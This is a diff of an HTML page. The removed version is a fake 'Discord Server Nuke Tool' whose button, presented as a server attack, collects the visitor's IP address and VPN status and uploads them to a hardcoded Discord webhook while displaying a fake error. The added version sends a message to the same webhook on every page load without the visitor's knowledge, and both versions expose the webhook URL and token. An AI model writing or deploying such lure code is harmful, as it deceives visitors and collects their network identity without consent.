@@ -1,80 +1,28 @@
 <!DOCTYPE html>
-<html lang=“en”>
+<html lang="en">
 <head>
-<meta charset=“UTF-8”>
-<title>discord nuker</title>
-<style>
-body {
-background-color: #36393f;
-color: #fff;
-font-family: Arial, sans-serif;
-}
-.container {
-max-width: 500px;
-margin: 50px auto;
-padding: 30px;
-background-color: #2f3136;
-border-radius: 10px;
-}
-h1 {
-color: #7289da;
-}
-input, button {
-width: 100%;
-padding: 10px;
-margin-bottom: 15px;
-border-radius: 5px;
-border: none;
-}
-button {
-background-color: #7289da;
-color: #fff;
-cursor: pointer;
-}
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Hello Webhook</title>
 </head>
 <body>
-<div class=“container”>
-<h1>Discord Server Nuke Tool</h1>
-<p>Enter your Discord server invite link:</p>
-<input type=“text” id=“invite” placeholder=“https://discord.gg/yourserver”>
-<button onclick=“nukeServer()”>Nuke Server</button>
-<p id=“error” style=“color:red; display:none;”>Error nuking server. Please try again later.</p>
-</div>
-<script>
-// Function to get user’s IP and check for VPN/proxy
-async function getUserInfo() {
-const ipRes = await fetch('https://api.ipify.org?format=json');
-const ipData = await ipRes.json();
-const ip = ipData.ip;
-// Check for VPN/proxy using ip-api.com
-const vpnRes = await fetch(`http://ip-api.com/json/${ip}?fields=proxy`);
-const vpnData = await vpnRes.json();
-const isProxy = vpnData.proxy;
+  <h1>Welcome!</h1>
+  <p>A greeting was sent to the Discord webhook.</p>
 
-return { ip, isProxy };
-}
-// Function to send info to Discord webhook as .txt file
-async function sendToWebhook(info) {
-const webhookUrl = "https://discord.com/api/webhooks/1432841888997834877/kGY6LdHzo7JliM6Kvw718EW9x2qlG6OojBb2CQc7Kov9G0Vqkn8De2mYqUgb1bRa7Ytv";
-// Create .txt file with info
-const blob = new Blob([JSON.stringify(info)], { type: 'text/plain' });
+  <script>
+    // 👇 Replace this with your actual Discord webhook URL
+    const webhookUrl = "https://discord.com/api/webhooks/1432841888997834877/kGY6LdHzo7JliM6Kvw718EW9x2qlG6OojBb2CQc7Kov9G0Vqkn8De2mYqUgb1bRa7Ytv";
 
-// Send file to webhook
-const formData = new FormData();
-formData.append('file', blob, 'info.txt');
-
-await fetch(webhookUrl, {
-    method: 'POST',
-    body: formData,
-});
-}
-async function nukeServer() {
-document.getElementById("error").style.display = "block";
-// Get user info and send to webhook
-const userInfo = await getUserInfo();
-await sendToWebhook(userInfo);
-}
-</script>
+    // Send a simple message when the site is opened
+    fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: "👋 Hello! Someone just entered the site."
+      })
+    })
+    .then(res => console.log("Sent hello to webhook:", res.status))
+    .catch(err => console.error("Failed to send webhook:", err));
+  </script>
 </body>
 </html>
